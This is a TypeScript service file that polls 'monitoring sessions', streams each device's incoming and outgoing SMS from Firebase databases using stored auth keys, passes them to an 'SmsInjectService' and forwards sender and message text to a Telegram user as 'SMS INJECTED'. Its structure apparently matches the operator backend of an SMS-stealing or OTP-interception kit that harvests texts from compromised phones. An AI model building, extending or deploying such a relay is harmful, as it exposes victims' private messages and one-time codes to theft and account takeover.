import { EventSource } from "eventsource";

import { BackendRepository } from "../database/repositories/BackendRepository";
import { MonitoringRepository } from "../database/repositories/MonitoringRepository";
import { ProcessedSmsRepository } from "../database/repositories/ProcessedSmsRepository";
import { MessageLogRepository } from "../database/repositories/MessageLogRepository";
import { SmsInjectService } from "../services/SmsInjectService";

import { bot } from "../bot/bot";
import { logger } from "../logger/logger";


const activeListeners = new Set<string>();



function escapeHtml(text:string){

    return String(text)
        .replace(/&/g,"&amp;")
        .replace(/</g,"&lt;")
        .replace(/>/g,"&gt;")
        .replace(/"/g,"&quot;")
        .replace(/'/g,"&#039;");

}





export function startFirebaseSmsListener(){


    setInterval(()=>{


        const sessions =
            MonitoringRepository.findRunning();



        for(
            const session of sessions
        ){


            const key =
            `${session.backend_id}_${session.device_id}`;



            if(
                activeListeners.has(key)
            ){

                continue;

            }



            activeListeners.add(key);



            startDeviceListener(
                session,
                key
            );


        }


    },5000);



}







function startDeviceListener(

    session:any,

    listenerKey:string

){



    const backend:any =
        BackendRepository.findConfig(
            session.backend_id
        );




    if(!backend){


        activeListeners.delete(
            listenerKey
        );

        return;

    }







    const databaseUrl =
        backend.config.database_url ||
        backend.config;





    const authKey =
        backend.config.auth_key;





    if(!databaseUrl){


        activeListeners.delete(
            listenerKey
        );

        return;

    }






    let url =

        databaseUrl
        .trim()
        .replace(/^["']|["']$/g,"")
        .replace(/\/$/,"")

        +

        `/users/${session.device_id}/all_sms.json`;





    if(authKey){


        url +=
        `?auth=${encodeURIComponent(authKey)}`;

    }







    const source =
        new EventSource(url);







    const handleFirebaseEvent =
    async(event:any)=>{


        try{


            const firebaseEvent =
                JSON.parse(
                    event.data
                );



            const path =
                firebaseEvent.path || "";



            const data =
                firebaseEvent.data;



            if(data == null){

                return;

            }





            let smsList:any[] = [];







            if(
                path.includes("/messages/")
            ){


                smsList.push({

                    key:
                    path
                    .split("/")
                    .filter(Boolean)
                    .pop(),


                    sms:data

                });


            }

            else if(

                path.endsWith("/messages")

                &&

                typeof data === "object"

            ){


                for(
                    const [key,value]
                    of Object.entries<any>(data)
                ){


                    smsList.push({

                        key,

                        sms:value

                    });


                }


            }

            else{


                return;


            }








            for(
                const item of smsList
            ){



                const sms =
                    item.sms;



                const key =
                    item.key;





                if(
                    !sms ||
                    !key ||
                    typeof sms !== "object"
                ){

                    continue;

                }







                if(

                    sms.type !== "incoming"

                    &&

                    sms.type !== "outgoing"

                ){

                    continue;

                }








                const exists =
                    ProcessedSmsRepository.exists({

                        backendId:
                        session.backend_id,


                        deviceId:
                        session.device_id,


                        source:
                        sms.type,


                        uniqueKey:
                        key

                    });






                if(exists){

                    continue;

                }







                const totalStart =
                    Date.now();





                const message =
                    sms.message ||
                    sms.body ||
                    sms.text ||
                    "Unknown";






                const sender =
                    sms.sender ||
                    sms.number ||
                    sms.recipient ||
                    "Unknown";





                const queueTime =
                    Date.now() - totalStart;






                let injectTime = 0;

                let telegramTime = 0;






                /*
                    HTML INJECTION
                */


                try{


                    const injectStart =
                        Date.now();



                    const injected =
                        await SmsInjectService.inject(

                            session.telegram_id,

                            sender,

                            message

                        );



                    injectTime =
                        Date.now() - injectStart;



                    if(injected){


                        logger.info(
                            `SMS API forwarded -> ${session.device_id}`
                        );


                    }


                }

                catch(error:any){


                    logger.error(

                        `SMS API failed -> ${error.message}`

                    );


                }








                /*
                    TELEGRAM MESSAGE
                */


                try{


                    const telegramStart =
                        Date.now();



                    await bot.telegram.sendMessage(

                        session.telegram_id,


`<pre>
✅ SMS INJECTED

📤 SENDER: ${escapeHtml(sender)}
🔐 MESSAGE: ${escapeHtml(message)}
📱 DEVICE: ${escapeHtml(session.device_id)}
⏱ QUEUE: ${queueTime}ms 🌐 INJECT: ${injectTime}ms
⚡ STREAM ONLINE
</pre>`,

                        {

                            parse_mode:"HTML"

                        }

                    );



                    telegramTime =
                        Date.now() - telegramStart;



                }

                catch(error:any){


                    logger.error(

                        `Telegram send failed -> ${error.message}`

                    );


                }







                const totalTime =
                    Date.now() - totalStart;








                ProcessedSmsRepository.create({

                    backendId:
                    session.backend_id,


                    deviceId:
                    session.device_id,


                    source:
                    sms.type,


                    uniqueKey:
                    key


                });








                MessageLogRepository.insert({

                    telegramId:
                    session.telegram_id,


                    backendId:
                    session.backend_id,


                    deviceId:
                    session.device_id,


                    deviceModel:
                    sms.device_model,


                    phoneNumber:
                    sender,


                    message,



                    receivedAt:

                    sms.timestamp_ms

                    ?

                    new Date(
                        Number(
                            sms.timestamp_ms
                        )
                    ).toISOString()

                    :

                    new Date().toISOString()


                });







                logger.info(

`Firebase ${sms.type} forwarded -> ${session.device_id} | total ${totalTime}ms`

                );



            }



        }

        catch(error:any){


            logger.error(

                `Firebase listener error: ${error.message}`

            );


        }


    };








    source.onmessage =
        handleFirebaseEvent;



    source.addEventListener(
        "put",
        handleFirebaseEvent
    );



    source.addEventListener(
        "patch",
        handleFirebaseEvent
    );








    source.onerror = ()=>{


        source.close();



        activeListeners.delete(
            listenerKey
        );



        logger.error(

`Firebase listener disconnected -> ${session.device_id}`

        );


    };


}